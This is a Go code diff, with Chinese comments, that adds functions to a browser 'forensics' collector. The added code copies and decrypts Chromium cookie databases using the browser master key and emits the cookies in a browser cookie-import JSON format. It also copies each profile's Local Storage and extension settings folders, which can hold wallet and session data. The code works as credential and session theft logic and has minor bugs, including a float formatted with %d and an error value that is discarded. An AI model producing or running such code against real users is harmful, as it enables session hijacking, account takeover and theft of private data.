@@ -10,6 +10,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"strconv"
 	"strings"
 )
 
@@ -86,7 +87,7 @@ func readSQLiteDB(dbPath string, query string) (string, error) {
 	var builder strings.Builder
 
 	// 创建一个临时文件
-	tempFile, err := os.CreateTemp("", "chrome-history-*.db")
+	tempFile, err := os.CreateTemp("", "chrome-passwords-*.db")
 	if err != nil {
 		return "", err
 	}
@@ -194,9 +195,155 @@ func ChromePasswords() (string, error) {
 	return builder.String(), nil
 }
 
+func readSQLiteDB2(dbPath string, query string) (string, interface{}) {
+
+	// 创建一个 strings.Builder 对象，用于构建最终的字符串结果
+	var builder strings.Builder
+
+	// 创建一个临时文件
+	tempFile, err := os.CreateTemp("", "chrome-cookies-*.db")
+	if err != nil {
+		return "", err
+	}
+	defer os.Remove(tempFile.Name()) // 确保临时文件在函数结束时被删除
+
+	// 将数据库文件复制到临时文件
+	if err := utils.CopyFile(dbPath, tempFile.Name()); err != nil {
+		return "", err
+	}
+
+	// 打开 SQLite 数据库
+	db, err := sql.Open("sqlite3", tempFile.Name())
+	if err != nil {
+		return "", err
+	}
+	defer db.Close()
+
+	// 执行 SQL 查询
+	rows, err := db.Query(query)
+	if err != nil {
+		return "", err
+	}
+	defer rows.Close()
+
+	// 获取查询结果的列数
+	columns, err := rows.Columns()
+	if err != nil {
+		return "", err
+	}
+
+	// 预分配切片以存储每一行的数据
+	values := make([]interface{}, len(columns))
+	valuePtrs := make([]interface{}, len(columns))
+
+	// 遍历查询结果
+	for rows.Next() {
+		for i := range columns {
+			valuePtrs[i] = &values[i]
+		}
+
+		if err := rows.Scan(valuePtrs...); err != nil {
+			return "", err
+		}
+		var domain string
+		var name string
+		var path string
+		var num float64
+		var encryptedValue string
+		// 将结果添加到 strings.Builder 中
+		for i, value := range values {
+			var fieldValue string
+			switch v := value.(type) {
+			case []byte:
+				fieldValue = string(v)
+			case string:
+				fieldValue = v
+			default:
+				fieldValue = fmt.Sprintf("%v", v)
+			}
+			// 如果当前字段是 password_value，则进行解密
+			if columns[i] == "encrypted_value" {
+				decryptedValue, err := utils.DecryptAESGCM([]byte(fieldValue), MasterKey)
+				if err != nil {
+					fmt.Errorf("failed to decrypt cookie: %w", err)
+				}
+				fieldValue = string(decryptedValue)
+			}
+			if columns[i] == "expires_utc" {
+				result, err := strconv.ParseInt(fieldValue, 10, 64)
+				if err != nil {
+					return "", fmt.Errorf("failed to parse expires_utc: %w", err)
+				}
+				// 计算 num
+				if float64(result)/1000000.0-11644473600.0 > 0.0 {
+					num = float64(result)/1000000.0 - 11644473600.0
+				}
+			}
+
+			// 添加标签和值
+			switch columns[i] {
+			case "host_key":
+				domain = fieldValue
+				//builder.WriteString(fmt.Sprintf(`  "domain": "%s",\n`, fieldValue))
+			case "name":
+				name = fieldValue
+				//builder.WriteString(fmt.Sprintf(`  "name": "%s",\n`, fieldValue))
+			case "encrypted_value":
+				encryptedValue = fieldValue
+				//builder.WriteString(fmt.Sprintf(`  "value": "%s",\n`, fieldValue))
+			case "path":
+				path = fieldValue
+				//builder.WriteString(fmt.Sprintf(`  "path": "%s",\n`, fieldValue))
+				//builder.WriteString(fmt.Sprintf(`  "expirationDate": %.1f,\n`, num))
+			}
+
+		}
+		// 构建 JSON 字符串
+		jsonStr := fmt.Sprintf(`{
+			"domain": "%s",
+			"expirationDate": %d,
+			"hostOnly": false,
+			"name": "%s",
+			"path": "%s",
+			"session": true,
+			"storeId": null,
+			"value": "%s"
+		}`, domain, num, name, path, encryptedValue)
+		builder.WriteString(jsonStr)
+
+		builder.WriteString("\n")
+	}
+
+	// 返回构建的字符串结果
+	return builder.String(), nil
+}
+
 func ChromeCookies() (string, error) {
-	// 实现获取 cookies 的逻辑
-	return "", nil
+	var builder strings.Builder
+	// 获取所有浏览器配置文件的数组
+	array := profiles //
+
+	if MasterKey == nil {
+		return "", nil
+	}
+	// 遍历每个配置文件
+	for _, profile := range array {
+		CookiesPath1 := filepath.Join(BrowserPath, profile, "Cookies")
+		CookiesPath2 := filepath.Join(BrowserPath, profile, "Network", "Cookies")
+		// 检查 text2 是否存在
+		if _, err := os.Stat(CookiesPath1); os.IsNotExist(err) {
+			// 如果 text2 不存在，尝试使用 text3
+			CookiesPath1 = CookiesPath2
+		}
+
+		// 再次检查 text2 是否存在
+		if _, err := os.Stat(CookiesPath1); os.IsNotExist(err) {
+			return "", fmt.Errorf("both paths do not exist: %s and %s", CookiesPath1, CookiesPath2)
+		}
+		result, _ := readSQLiteDB2(CookiesPath1, "SELECT host_key, name, encrypted_value,path,expires_utc FROM cookies")
+		builder.WriteString(result)
+	}
+	return builder.String(), nil
 }
 func ChromeBooks() (string, error) {
 	// 实现获取 bookmarks 的逻辑
@@ -330,6 +477,45 @@ func ChromeHistory() string {
 	return builder.String()
 }
 
+// CopyDirectory 递归复制目录
+func CopyDirectory(src, dst string) error {
+	// 读取源目录的内容
+	files, err := ioutil.ReadDir(src)
+	if err != nil {
+		return fmt.Errorf("failed to read directory %s: %w", src, err)
+	}
+
+	// 创建目标目录
+	err = os.MkdirAll(dst, os.ModePerm)
+	if err != nil {
+		return fmt.Errorf("failed to create directory %s: %w", dst, err)
+	}
+
+	for _, file := range files {
+		srcPath := filepath.Join(src, file.Name())
+		dstPath := filepath.Join(dst, file.Name())
+
+		if file.IsDir() {
+			// 递归复制子目录
+			err = CopyDirectory(srcPath, dstPath)
+			if err != nil {
+				return err
+			}
+		} else {
+			// 复制文件
+			input, err := ioutil.ReadFile(srcPath)
+			if err != nil {
+				return fmt.Errorf("failed to read file %s: %w", srcPath, err)
+			}
+			err = ioutil.WriteFile(dstPath, input, file.Mode())
+			if err != nil {
+				return fmt.Errorf("failed to write file %s: %w", dstPath, err)
+			}
+		}
+	}
+
+	return nil
+}
 func ChromeSave(path string) {
 
 	for browserName, browserPath := range browserOnChromium {
@@ -398,8 +584,59 @@ func ChromeSave(path string) {
 				return
 			}
 		}
+		cookies, err := ChromeCookies()
+		if cookies != "" {
+			outputFile := BrowserName + "_cookies.txt"
+			if err := utils.WriteToFile(cookies, targetDir+"\\"+outputFile); err != nil {
+				fmt.Println("Error writing to file:", err)
+				return
+			}
 
+		}
+		array := profiles //
+
+		// 遍历每个配置文件
+		for _, profile := range array {
+			//configPath := filepath.Join(BrowserPath, profile)
+			//err := CreateDirectory(configPath)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+			// 复制 Local Storage 目录
+			localStorageSrc := filepath.Join(BrowserPath, profile, "Local Storage")
+			localStorageDst := filepath.Join(targetDir, profile, "Local Storage")
+			if _, err := os.Stat(localStorageSrc); err == nil {
+				err = CopyDirectory(localStorageSrc, localStorageDst)
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+			}
+			// 复制 Local Extension Settings 目录
+			localExtSettingsSrc := filepath.Join(BrowserPath, profile, "Local Extension Settings")
+			localExtSettingsDst := filepath.Join(targetDir, profile, "Local Extension Settings")
+			if _, err := os.Stat(localExtSettingsSrc); err == nil {
+				err = CopyDirectory(localExtSettingsSrc, localExtSettingsDst)
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+			}
+
+			// 复制 Sync Extension Settings 目录
+			syncExtSettingsSrc := filepath.Join(BrowserPath, profile, "Sync Extension Settings")
+			syncExtSettingsDst := filepath.Join(targetDir, profile, "Sync Extension Settings")
+			if _, err := os.Stat(syncExtSettingsSrc); err == nil {
+				err = CopyDirectory(syncExtSettingsSrc, syncExtSettingsDst)
+				if err != nil {
+					fmt.Println(err)
+					return
+				}
+			}
+
+		}
 	}
-	fmt.Println("chrome浏览器取证结束")
+	fmt.Println("Chrome内核浏览器取证结束")
 
 }
